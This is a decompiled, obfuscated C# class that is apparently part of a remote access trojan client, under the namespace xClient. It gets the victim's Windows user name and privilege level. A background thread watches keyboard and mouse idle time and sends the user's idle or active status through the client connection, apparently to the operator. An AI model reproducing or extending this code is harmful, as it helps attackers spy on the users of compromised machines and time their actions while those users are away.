using System;
using System.Diagnostics;
using System.Runtime.CompilerServices;
using System.Security.Principal;
using System.Threading;
using xClient.Core.Packets.ClientPackets;

public static class GClass41
{
	[CompilerGenerated]
	private static GEnum3 genum3_0;

	public static GEnum3 LastUserStatus
	{
		[CompilerGenerated]
		get
		{
			return genum3_0;
		}
		[CompilerGenerated]
		set
		{
			genum3_0 = value;
		}
	}

	public static string smethod_0()
	{
		return Environment.UserName;
	}

	public static string smethod_1()
	{
		using (WindowsIdentity windowsIdentity = WindowsIdentity.GetCurrent())
		{
			if (windowsIdentity != null)
			{
				WindowsPrincipal windowsPrincipal = new WindowsPrincipal(windowsIdentity);
				if (windowsPrincipal.IsInRole(WindowsBuiltInRole.Administrator))
				{
					return "Admin";
				}
				if (windowsPrincipal.IsInRole(WindowsBuiltInRole.User))
				{
					return "User";
				}
				if (windowsPrincipal.IsInRole(WindowsBuiltInRole.Guest))
				{
					return "Guest";
				}
			}
		}
		return "Unknown";
	}

	public static void smethod_2()
	{
		Thread thread = new Thread(smethod_3);
		thread.IsBackground = true;
		thread.Start();
	}

	private static void smethod_3()
	{
		while (!GClass34.Exiting)
		{
			Thread.Sleep(5000);
			if (smethod_4())
			{
				if (LastUserStatus != 0)
				{
					LastUserStatus = GEnum3.const_0;
					new SetUserStatus(LastUserStatus).Execute(Class0.gclass34_0);
				}
			}
			else if (LastUserStatus != GEnum3.const_1)
			{
				LastUserStatus = GEnum3.const_1;
				new SetUserStatus(LastUserStatus).Execute(Class0.gclass34_0);
			}
		}
	}

	private static bool smethod_4()
	{
		long num = Stopwatch.GetTimestamp() - GClass45.smethod_0();
		num = ((num > 0L) ? (num / 1000L) : 0L);
		return num > 600L;
	}
}
